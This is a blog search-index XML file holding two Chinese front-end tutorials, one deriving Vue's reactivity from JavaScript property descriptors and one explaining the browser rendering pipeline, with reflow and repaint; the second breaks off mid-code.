<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>从 JS 属性描述符再看 Vue 数据响应式原理</title>
      <link href="/posts/24974.html"/>
      <url>/posts/24974.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="前提"><a class="markdownIt-Anchor" href="#前提"></a> 前提</h2><p>在阅读本篇文章之前，你应该对 JS 的属性描述符有所了解，如果没有，欢迎你阅读我的这篇文章《<a href="https://4rozen.github.io/posts/1">JS 属性描述符</a>》</p><h2 id="场景"><a class="markdownIt-Anchor" href="#场景"></a> 场景</h2><p>假设有以下的 HTML 代码描述一个页面：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Demo 1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"name"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"time"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> goods = {</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>: <span class="string">"苹果"</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">price</span>: <span class="number">5.5</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">purchaseTime</span>: <span class="string">"2025-01-01"</span>,</span></span><br><span class="line"><span class="language-javascript">  }</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 显示商品的名字</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> <span class="title function_">showName</span> = (<span class="params"></span>) =&gt; {</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> nameDom = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"name"</span>)</span></span><br><span class="line"><span class="language-javascript">    nameDom.<span class="property">innerHTML</span> = <span class="string">`商品名称：<span class="subst">${goods.name}</span>`</span></span></span><br><span class="line"><span class="language-javascript">  }</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 显示已存放的时间</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> <span class="title function_">showPurchaseTime</span> = (<span class="params"></span>) =&gt; {</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> timeDom = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"time"</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>()</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> purchaseDate = <span class="keyword">new</span> <span class="title class_">Date</span>(goods.<span class="property">purchaseTime</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> diffTime = <span class="title class_">Math</span>.<span class="title function_">abs</span>(now - purchaseDate)</span></span><br><span class="line"><span class="language-javascript">    timeDom.<span class="property">innerHTML</span> = <span class="string">`商品存放距今已有：<span class="subst">${<span class="built_in">Math</span>.floor(diffTime / (<span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>))}</span>天`</span></span></span><br><span class="line"><span class="language-javascript">  }</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">showName</span>()</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">showPurchaseTime</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>就这样一个简单的页面，将来要改动 goods 的信息的时候，比如更改商品名称，在调用两个函数的后面加上：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">showName</span>()</span><br><span class="line"><span class="title function_">showPurchaseTime</span>()</span><br><span class="line">goods.<span class="property">name</span> = <span class="string">"梨"</span></span><br></pre></td></tr></tbody></table></figure><p>很显然，页面数据是不会随之更新的，除非在 <code>goos.name = "梨"</code> 的下一行再次调用 <code>showName()</code> 函数。<br>换句话说，就是在更改了属性之后，我们应该调用依赖于该属性的函数。这样才能保证页面和数据是统一的。</p><div class="note info no-icon flat"><p>有的朋友可能会说，那还不是你函数写的有问题，你写成下面这样不就好了？</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">showName</span> = (<span class="params">name</span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> nameDom = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"name"</span>)</span><br><span class="line">  nameDom.<span class="property">innerHTML</span> = <span class="string">`商品名称：<span class="subst">${name}</span>`</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这样不就可以在更改商品名字的时候更新页面了吗？</p><p>是的，确实可以。但是这会给你增加额外的心智负担。每有一次更新数据需求，你都要尝试找到这个对象的这个属性是否有对应的更新函数，这您受得了吗？</p></div><p>请大家忘记 Vue 的存在，让我们穿越回尤雨溪还没有写出 Vue 的时候，站在他的角度来想想，这个问题应该如何解决。</p><h2 id="思考解决方案"><a class="markdownIt-Anchor" href="#思考解决方案"></a> 思考解决方案</h2><p>回忆上述困境，它真的好解决吗？</p><p>即使我们能够想出一种办法，能够在程序中每一次更改属性的时候自动加上调用函数的代码，但是这样就够了吗？<br>很明显是不够的，因为就算我们把代码写完，属性依然可以被更改。用户还可以直接在 F12 的开发者工具中更改，这您受得了嘛？</p><p>这就是说，我们根本无法知道属性到底在哪里被更改了…… 吗？</p><p>回忆之前的属性描述符，<code>get()</code> 和 <code>set()</code> 是不是能够帮我们得到一些信息呢？</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> internalVal = goods.<span class="property">name</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(goods, <span class="string">"name"</span>, {</span><br><span class="line">  <span class="attr">get</span>: <span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"发生了获取商品名称行为，当前名称为："</span> + internalVal)</span><br><span class="line">    <span class="keyword">return</span> internalVal</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">set</span>: <span class="function">(<span class="params">val</span>) =&gt;</span> {</span><br><span class="line">    internalVal = val</span><br><span class="line">    <span class="title function_">showName</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"发生了修改商品名称的行为，新名称为："</span> + val)</span><br><span class="line">  }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p>我们加上上述代码，是不是就能得到一些信息？</p><p><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202509041321795.png" alt="image-20250904132145755"></p><p>但是这够吗？很明显不够啊，因为我们这里的调用是写死的，未来我们知道有多少函数会用到这个属性吗？不太可能的。而且将来每有一个项目，就写一个 <code>defineProperty</code>，这也太麻烦了。</p><h2 id="试写方案"><a class="markdownIt-Anchor" href="#试写方案"></a> 试写方案</h2><p>我们试着写一个通用 js 来解决上述问题，将其命名为 <code>auv.js</code> 吧，我们就不写 <code>Vue</code> 了，我们功力还没那么深厚。</p><p>上面我们增加的代码只观察了 <code>name</code> 属性，这也不太通用，项目中只观察一个属性的情况太少了，我们写一个观察全部属性的：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 观察某个对象的全部属性</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> <span class="variable">obj</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">observer</span> = (<span class="params">obj</span>) =&gt; {</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) {</span><br><span class="line">    <span class="keyword">let</span> internalVal = obj[key];</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, key, {</span><br><span class="line">      <span class="title function_">get</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="keyword">return</span> internalVal;</span><br><span class="line">      },</span><br><span class="line">      <span class="title function_">set</span>(<span class="params">val</span>) {</span><br><span class="line">        internalVal = val;</span><br><span class="line">        <span class="comment">// 如何触发依赖更新？</span></span><br><span class="line">      }</span><br><span class="line">    })</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>问题就来了，写成通用的之后，我们根本不知道该如何触发依赖（某个使用到被关注的属性的函数）更新。前面好歹还能手写 <code>showName()</code> 触发更新，现在根本不知道。</p><p>现在我们就需要想想，是不是我们对依赖的来源根本不知道？本质就是：谁在用我们的属性？</p><p>但是这个问题正好 <code>get()</code> 能解决啊，只要有函数在用到我们关注的属性，那么 <code>get()</code> 就一定能知道谁在用。这就是说：<code>get()</code> 需要记录到底谁在用我；而 <code>set()</code> 需要运行那个用我的函数。</p><div class="note info no-icon flat"><p>这个在 Vue 中有专门的名词：</p><ul><li>依赖收集：记录哪个函数在用我</li><li>派发更新：运行用我的那个函数</li></ul></div><p>我们更新一下 <code>observer</code>：</p><p>思考一下，为什么要用 <code>new Set()</code> 而不是普通数组？</p><details class="folding-tag"><summary> 点我查看原因 </summary>              <div class="content">              <p>用 <code>new Set()</code> 而不是普通数组，相信你能想到是去重。还有一个原因就是，我们根本不知道依赖使用到了几次属性，如果使用了多次，那么普通数组就会记录多个同样的函数，这大大降低了效率。</p>              </div>            </details><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 观察某个对象的全部属性</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> <span class="variable">obj</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">observer</span> = (<span class="params">obj</span>) =&gt; {</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) {</span><br><span class="line">    <span class="keyword">let</span> internalVal = obj[key];</span><br><span class="line">    <span class="keyword">let</span> fns = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, key, {</span><br><span class="line">      <span class="title function_">get</span>(<span class="params"></span>) {</span><br><span class="line">        fns.<span class="title function_">add</span>(exampleFn)</span><br><span class="line">        <span class="keyword">return</span> internalVal;</span><br><span class="line">      },</span><br><span class="line">      <span class="title function_">set</span>(<span class="params">val</span>) {</span><br><span class="line">        internalVal = val;</span><br><span class="line">        <span class="comment">// 派发更新</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> fn <span class="keyword">of</span> fns) {</span><br><span class="line">          <span class="title function_">fn</span>();</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    })</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>现在兜兜转转又回到了之前的问题，我们到底如何记录 <code>exampleFn</code> 呢？到底谁在用我的属性？</p><p><code>Vue</code> 用了一个极其巧妙的方式解决了这个问题：<strong>定义一个全局变量，帮你运行想要运行的函数。</strong></p><p>比如，在我们这个简单场景下，可以定义一个 <code>window.__auv</code> 来收集要运行的函数：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将html内部js抽离为 demo1.js 并更新 demo1.js 如下</span></span><br><span class="line"><span class="title function_">observer</span>(goods) <span class="comment">// 设置观察对象</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">__auv</span> = showName <span class="comment">// 设置全局变量收集对象</span></span><br><span class="line"><span class="title function_">showName</span>()</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">__auv</span> = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新 auv.js 如下</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 观察某个对象的全部属性</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> <span class="variable">obj</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">observer</span> = (<span class="params">obj</span>) =&gt; {</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) {</span><br><span class="line">    <span class="keyword">let</span> internalVal = obj[key];</span><br><span class="line">    <span class="keyword">let</span> fns = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, key, {</span><br><span class="line">      <span class="title function_">get</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">__auv</span>) {</span><br><span class="line">          fns.<span class="title function_">add</span>(<span class="variable language_">window</span>.<span class="property">__auv</span>)</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> internalVal;</span><br><span class="line">      },</span><br><span class="line">      <span class="title function_">set</span>(<span class="params">val</span>) {</span><br><span class="line">        internalVal = val;</span><br><span class="line">        <span class="comment">// 派发更新</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> fn <span class="keyword">of</span> fns) {</span><br><span class="line">          <span class="title function_">fn</span>();</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    })</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>此时页面表现：</p><p><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202509041423262.gif" alt="PixPin_2025-09-04_14-22-41"></p><p>现在还有点不太完美，每次都要写下面三句：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">__auv</span> = showName</span><br><span class="line"><span class="title function_">showName</span>()</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">__auv</span> = <span class="literal">null</span></span><br></pre></td></tr></tbody></table></figure><p>完全可以在 <code>auv.js</code> 中写成函数：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// auv.js</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">easyRun</span> = (<span class="params">fn</span>) =&gt; {</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">__auv</span> = fn;</span><br><span class="line">  <span class="title function_">fn</span>();</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">__auv</span> = <span class="literal">null</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>那么 <code>demo1.js</code> 中那三句话就可以写成一句话：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">easyRun</span>(showName)</span><br></pre></td></tr></tbody></table></figure><p>我们可以加一个 <code>input</code> 将输入的值去更改商品名字，方便展示效果：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">oninput</span>=<span class="string">"goods.name = this.value"</span>/&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>页面效果：</p><p><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202509041431829.gif" alt="PixPin_2025-09-04_14-31-03"></p><p>当然我们现在的这份代码肯定有很多 bug，<code>Vue</code> 的代码比我们的这个版本健全得多。</p><p>至此，相信你已经对 <code>Vue</code> 的数据响应式有更深刻的认识。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> 属性描述符 </tag>
            
            <tag> 数据响应式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器渲染原理</title>
      <link href="/posts/1303.html"/>
      <url>/posts/1303.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="渲染时间点"><a class="markdownIt-Anchor" href="#渲染时间点"></a> 渲染时间点</h2><p>还记得事件循环中，我们提到了渲染进程，并着重分析了渲染主线程、队列和其他线程的合作过程，要了解渲染时间点还需要网络进程以及它开启的网络线程。如下图：</p><p><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202509021825388.png" alt="浏览器渲染原理-渲染时间点"></p><p>上图即是：当浏览器的网络线程收到 HTML 文档后，产生一个渲染任务，并将其传递给渲染主线程的消息队列。在事件循环机制的作用下，渲染主线程取出消息队列中的渲染任务，开启渲染流程。</p><h2 id="渲染流程"><a class="markdownIt-Anchor" href="#渲染流程"></a> 渲染流程</h2><p>整个渲染流程分为多个阶段，分别是：HTML 解析、样式计算、布局、分层、绘制、分块、光栅化、画。<br>每个阶段都有明确的输入输出，上一个阶段的输出会成为下一个阶段的输入。<br>这样，整个渲染流程就形成了一套组织严密的生产流水线。如下图：</p><p><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202509021835046.png" alt="浏览器渲染原理-渲染流程"></p><h3 id="解析htmlparse-html"><a class="markdownIt-Anchor" href="#解析htmlparse-html"></a> 解析 HTML（Parse HTML）</h3><p>渲染的第一步是解析 HTML。</p><p>解析过程中遇到 CSS 解析 CSS，遇到 JS 执行 JS。为了提高解析效率，浏览器在开始解析前，会启动一个预解析的线程，率先下载 HTML 中的外部 CSS 文件和外部的 JS 文件。<br>如果主线程解析到 <code>&lt;link&gt;</code> 位置，此时外部的 CSS 文件还没有下载解析好，主线程不会等待，继续解析后续的 HTML。这是因为下载和解析 CSS 的工作是在预解析线程中进行的。这就是 CSS 不会阻塞 HTML 解析的根本原因。如下图所示：</p><p><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202509021856283.png" alt="浏览器渲染原理-解析HTML-CSS"></p><p>如果主线程解析到 <code>&lt;script&gt;</code> 位置，会停止解析 HTML，转而等待 JS 文件下载好，并将全局代码解析执行完成后，才能继续解析 HTML。这是因为 JS 代码的执行过程可能会修改当前的 DOM 树，所以 DOM 树的生成必须暂停。这就是 JS 会阻塞 HTML 解析的根本原因。如下图所示：</p><p><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202509021906924.png" alt="浏览器渲染原理-解析HTML-JS"></p><p>第一步完成后，会得到 DOM 树和 CSSOM（CSS Object Model）树，浏览器的默认样式、内部样式、外部样式、行内样式均会包含在 CSSOM 树中。</p><h3 id="样式计算recalculate-style"><a class="markdownIt-Anchor" href="#样式计算recalculate-style"></a> 样式计算（Recalculate Style）</h3><p>解析 HTML 的下一步是样式计算。<br>主线程会遍历得到的 DOM 树，依次为树中的每个节点计算出它最终的样式，称之为 <code>Computed Style</code>。<br>在这一过程中，很多预设值会变成绝对值，比如 <code>red</code> 会变成 <code>rgb（255，0，0）</code>，相对单位会变成绝对单位，比如 <code>em</code> 会变成 <code>px</code><br>这一步完成后，会得到一棵带有样式的 DOM 树。</p><h3 id="布局layout"><a class="markdownIt-Anchor" href="#布局layout"></a> 布局（Layout）</h3><p>接下来是布局，布局完成后会得到布局树。<br>布局阶段会依次遍历 DOM 树的每一个节点，计算每个节点的几何信息。例如节点的宽高、相对包含块的位置。</p><p>大部分时候，DOM 树和布局树并非一一对应。<br>比如 <code>display：none</code> 的节点没有几何信息，因此不会生成到布局树；又比如使用了伪元素选择器，虽然 DOM 树中不存在这些伪元素节点，但它们拥有几何信息，所以会生成到布局树中。还有匿名行盒、匿名块盒等等都会导致 DOM 树和布局树无法一一对应。</p><h3 id="分层layer"><a class="markdownIt-Anchor" href="#分层layer"></a> 分层（Layer）</h3><p>这一步的分层结果可以借助浏览器开发者工具（F12）的图层（Layers）工具可视化地看见。每个浏览器甚至浏览器它自己的每个版本，对分层的实现方式都可能不太一样。</p><p>分层结果可以被堆叠上下文有关的属性（<code>z-index</code>、<code>opacity</code>、<code>transform</code>……）影响，但只是影响决策，不一定影响到最终结果。其中对结果影响比较大的属性是 <code>will-change</code>，比如单独给一个类名为 <code>container</code> 的 <code>div</code> 进行分层可以写成：</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> {</span><br><span class="line">  <span class="attribute">will-change</span>: transform;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>总的来说，主线程会使用一套复杂的策略对整个布局树中进行分层。<br>分层的好处在于，将来某一个层改变后，仅会对该层进行后续处理，从而提升效率。</p><p>滚动条、堆叠上下文、<code>transform</code>、<code>opacity</code> 等样式都会或多或少的影响分层结果，也可以通过 <code>wilL-change</code> 属性更大程度的影响分层结果。</p><p>注意，仅当效率出了问题，发现是分层的影响，某一区域经常变动，不希望重绘太多次，就可以尝试使用 <code>wilL-change</code>。</p><h3 id="绘制paint"><a class="markdownIt-Anchor" href="#绘制paint"></a> 绘制（Paint）</h3><p>这里的绘制指的不是绘制这个动作，而是为每一个分层单独产生绘制指令集，用来描述这一层该如何绘制。</p><p>完成绘制之后，渲染主线程将每个图层的绘制信息交给合成线程，渲染主线程的工作到此为止，剩余将由合成线程完成。</p><h3 id="分块tiling"><a class="markdownIt-Anchor" href="#分块tiling"></a> 分块（Tiling）</h3><p>合成线程首先对每个图层进行分块工作，将其划分为更多的小区域，这一工作将会启动多个线程来完成。</p><h3 id="光栅化raster"><a class="markdownIt-Anchor" href="#光栅化raster"></a> 光栅化（Raster）</h3><p>分块完成之后，就进入光栅化阶段。</p><p>合成线程会将块信息提交给 GPU 进程，GPU 进程会开启多个线程，以极高的速度完成光栅化，并且优先处理靠近视口区域的块。</p><p>光栅化的结果，就是一块一块的位图。</p><h3 id="画draw"><a class="markdownIt-Anchor" href="#画draw"></a> 画（Draw）</h3><p>合成线程拿到每个层、每个块的位图之后，生成一个个 "指引（quad）" 信息。</p><p>指引会标识出每个位图应该画到屏幕的哪个位置，以及考虑旋转、缩放等变形。</p><blockquote><p>变形发生在合成线程，与渲染主线程无关，这就是 <code>transform</code> 效率高的本质原因。</p></blockquote><p>由于渲染进程运行在沙盒中，与系统隔离，所以合成线程会把指引 <code>quad</code> 提交给 GPU 进程，由 GPU 进程产生系统调用，提交给 GPU 硬件，完成最终的屏幕成像。</p><h2 id="什么是reflow"><a class="markdownIt-Anchor" href="#什么是reflow"></a> 什么是 reflow</h2><p><code>reflow</code> 的本质就是重新计算 <code>layout</code> 树。</p><p>当进行了会影响布局树的操作后，需要重新计算布局树，会引发 <code>layout</code>。</p><p>为了避免连续的多次操作导致布局树反复计算，浏览器会合并这些操作，当 JS 代码全部完成后再进行统一计算。所以，改动属性造成的 <code>reflow</code> 是<mark class="hl-label orange">异步</mark> 完成的。<br>也因为如此，当 JS 获取布局属性时，这一获取操作是同步的，就可能造成无法获取到最新的布局信息。</p><p>浏览器在反复权衡下，最终决定获取属性时，立即 reflow。</p><h2 id="什么是repaint"><a class="markdownIt-Anchor" href="#什么是repaint"></a> 什么是 repaint</h2><p><code>repaint</code> 的本质就是重新根据分层信息计算了绘制指令。</p><p>当改动了可见样式后，就需要重新计算，会引发 <code>repaint</code>。</p><p>由于元素的布局信息也属于可见样式，所以 <code>reflow</code> 一定会引起 <code>repaint</code>。</p><h2 id="为什么transform效率高"><a class="markdownIt-Anchor" href="#为什么transform效率高"></a> 为什么 transform 效率高</h2><p>变形发生在合成线程，与渲染主线程无关，这就是 <code>transform</code> 效率高的本质原因。</p><p>可以通过下面的代码感受差别：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 